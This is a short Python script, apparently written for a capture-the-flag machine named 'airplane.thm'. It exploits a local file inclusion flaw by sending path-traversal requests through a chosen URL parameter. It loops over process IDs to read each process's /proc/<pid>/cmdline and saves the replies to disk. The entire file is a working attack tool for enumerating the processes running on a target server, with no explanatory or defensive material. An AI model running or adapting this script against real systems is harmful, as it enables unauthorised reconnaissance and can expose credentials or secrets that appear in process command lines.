import requests
import argparse
import os

def main():
    parser = argparse.ArgumentParser(description="LFI Exploit Script")
    parser.add_argument('-t', '--target', type=str, required=True, help='Target URL (e.g., http://airplane.thm)')
    parser.add_argument('-p', '--port', type=int, default=80, help='Target port (default: 80)')
    parser.add_argument('-l', '--lfi_param', type=str, help='LFI parameter (default: e.g. "page=)"')
    parser.add_argument('-r', '--range', type=int, default=1001, help='Range of PIDs to check (default: 1001)')
    
    args = parser.parse_args()
    
    if "http" not in args.target:
        args.target = f"http://{args.target}" 

    base_url = f"{args.target}:{args.port}/?{args.lfi_param}=../../../../../../proc/"
    print(f"Initialised script with base_url: {base_url}")
    headers = {
        'Host': f'{args.target}:{args.port}',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0',
        'Accept': '',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'If-None-Match': '"1713330376.3737798-1515-3732933866"',
        'If-Modified-Since': 'Wed, 17 Apr 2024 05:06:16 GMT',
        'Connection': 'close'
    }

    if not os.path.exists('responses'):
        os.makedirs('responses')

    for pid in range(1, args.range):
        url = f"{base_url}{pid}/cmdline"
        try:
            response = requests.get(url, headers=headers) 
            if response.text.strip() and "Page not found" not in response.text:
                print(f"Response for PID {pid}: {response.text}")
                with open(f"responses/{pid}.txt", "w") as file:
                    file.write(response.text)
        except Exception as e:
            print(f"Error with PID {pid}: {e}")

if __name__ == '__main__':
    main()